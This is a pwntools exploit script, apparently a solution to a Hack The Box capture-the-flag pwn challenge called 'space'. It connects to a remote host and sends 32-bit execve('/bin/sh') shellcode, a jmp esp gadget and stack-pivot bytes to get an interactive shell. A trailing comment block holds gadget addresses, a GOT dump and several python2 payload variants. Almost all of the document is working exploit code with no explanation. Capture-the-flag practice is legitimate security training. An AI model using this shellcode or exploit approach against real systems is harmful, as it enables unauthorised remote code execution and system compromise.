from pwn import *

HOST = "178.128.160.242"
PORT = 30215

r = remote(HOST, PORT)

shellcode = b"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
jmp_esp = b"\x9f\x91\x04\x08"

esp_shellcode = b"\x83\xC4\x40\x50\xC3"

r.sendlineafter(b"> ", shellcode + jmp_esp + esp_shellcode)

r.interactive()

'''
[INFO] File: /home/pb00170/CTF/HTB/pwn/space/space
0x0804919f: jmp esp;
"\x9f\x91\x04\x08"


[INFO] File: /home/pb00170/CTF/HTB/pwn/space/space
0x08049019: call eax;

python2 -c 'print("\x68\x01\x01\x01\x01\x50\x31\xC0\x50\x68\xD0\xB2\x04\x08\xC3" + "BBB" + "\x19\x90\x04\x08" + "XXXXXXXX" + "ZZZZZZZZZZZZZZZZZZZZ" )'

gef➤  got

GOT protection: No RelRO | GOT functions: 5
 
[0x804b2d0] read@GLIBC_2.0  →  0xf7ed8770
[0x804b2d4] printf@GLIBC_2.0  →  0xf7e4a360

0x8049030

python2 -c 'print("\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x9f\x91\x04\x08" + "\x83\xC4\x40\x50\xC3")'



python2 -c 'print("\x68\x01\x01\x01\x01\x50\x31\xC0\x50\x68\x30\x90\x04\x08\xC3" + "BBB" + "\x9f\x91\x04\x08" + "\x83\xC4\x40\x50\xC3" + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")'

python2 -c 'print("\x68\x01\x01\x01\x01\x50\x31\xDB\x53\x50\x68\x30\x90\x04\x08\xC3" + "BB" + "\x9f\x91\x04\x08" + "\x83\xC4\x40\x50\xC3" + "ABC\x90" + "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'


\x68\x01\x01\x01\x01\x50\x31\xC0\x50\xE8\x22\x90\x04\x08\xC3

'''